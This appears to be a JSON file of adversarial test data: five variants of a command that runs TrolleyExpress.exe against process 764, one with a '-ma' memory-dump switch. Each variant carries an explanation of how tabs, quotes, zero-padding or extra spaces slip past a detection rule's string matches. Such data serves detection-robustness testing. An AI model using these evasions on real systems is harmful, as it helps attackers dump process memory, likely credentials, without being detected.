@@ -1,0 +1,22 @@
+[
+  {
+    "output": "C:\\Temp\\TrolleyExpress.exe\t764",
+    "explanation": "Substitution technique: Replacing the expected space character separator before the process ID parameter with a horizontal tab character ('\\t'). The Windows command line and argument parsing APIs identify tabs as standard whitespace delimiters, allowing the execution parameter to be correctly delivered to the application logic while completely subverting the static literal matches like '\\TrolleyExpress.exe 7' or '\\TrolleyExpress 7' in 'selection'."
+  },
+  {
+    "output": "C:\\Temp\\TrolleyExpress.exe \"764\"",
+    "explanation": "Insertion technique: Injects double quotes around the positional argument parameter containing the process ID identifier. The standard Win32 environment extracts and parses the numeric argument cleanly upon initialization, but the literal contiguous character checks configured in the 'selection' logic (requiring an explicit leading space followed directly by the first digit, e.g., ' 7') are broken."
+  },
+  {
+    "output": "cmd.exe /c C:\\Temp\\TrolleyExpress.exe 000764",
+    "explanation": "Recoding / Encoding technique: Pads the targeted process identifier with leading arithmetic zeros. Argument parsers processing parameters as numeric structures or passing values into integer casting routines handle '000764' interchangeably with '764', which disrupts the strict string signature patterns matching explicitly against space-digit character strings (' 7', ' 8', ' 9')."
+  },
+  {
+    "output": "C:\\Temp\\TrolleyExpress.exe  764",
+    "explanation": "Insertion technique: Inserting an extra space character between the executable image layout string and the numeric identifier. Standard Windows application tokenizers merge contiguous whitespace sequences during shell parsing routines, ensuring functional behavior remains equivalent while avoiding static patterns expecting exactly a single space delimiter."
+  },
+  {
+    "output": "C:\\Temp\\TrolleyExpress.exe -ma\t764",
+    "explanation": "Substitution technique: Replaces the trailing single space in the common dumper pattern switch ('\\TrolleyExpress.exe -ma ') with a horizontal tab character ('\\t'). The memory dump utility recognizes the tab as a parameter separator, keeping execution valid while evading the rule's exact string tracking."
+  }
+]
